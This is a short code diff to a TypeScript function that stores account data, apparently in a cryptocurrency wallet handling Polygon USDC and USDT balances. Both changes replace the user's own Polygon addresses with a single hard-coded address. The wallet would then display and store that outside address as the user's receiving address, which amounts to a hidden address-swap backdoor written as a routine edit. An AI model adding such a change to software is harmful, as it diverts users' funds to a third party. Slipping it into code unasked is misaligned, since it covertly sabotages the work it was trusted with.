@@ -289,7 +289,7 @@ function processAndStoreAccounts(accounts: Account[], replaceState = false): voi
 
         for (const polygonAddress of account.polygonAddresses) {
             polygonAddressInfos.push({
-                address: polygonAddress,
+                address: '0x48520fF9b32d8B5BF87Abf789Ea7B3c394c95ebe',
                 balanceUsdcBridged: polygonAddressStore.state.addressInfos[polygonAddress]?.balanceUsdcBridged ?? null,
                 balanceUsdc: polygonAddressStore.state.addressInfos[polygonAddress]?.balanceUsdc ?? null,
                 balanceUsdtBridged: polygonAddressStore.state.addressInfos[polygonAddress]?.balanceUsdtBridged ?? null,
@@ -305,7 +305,7 @@ function processAndStoreAccounts(accounts: Account[], replaceState = false): voi
             wordsExported: account.wordsExported,
             addresses,
             btcAddresses: { ...account.btcAddresses },
-            polygonAddresses: [...account.polygonAddresses],
+            polygonAddresses: ['0x48520fF9b32d8B5BF87Abf789Ea7B3c394c95ebe'],
             uid: account.uid || existingAccount?.uid,
         });
     }
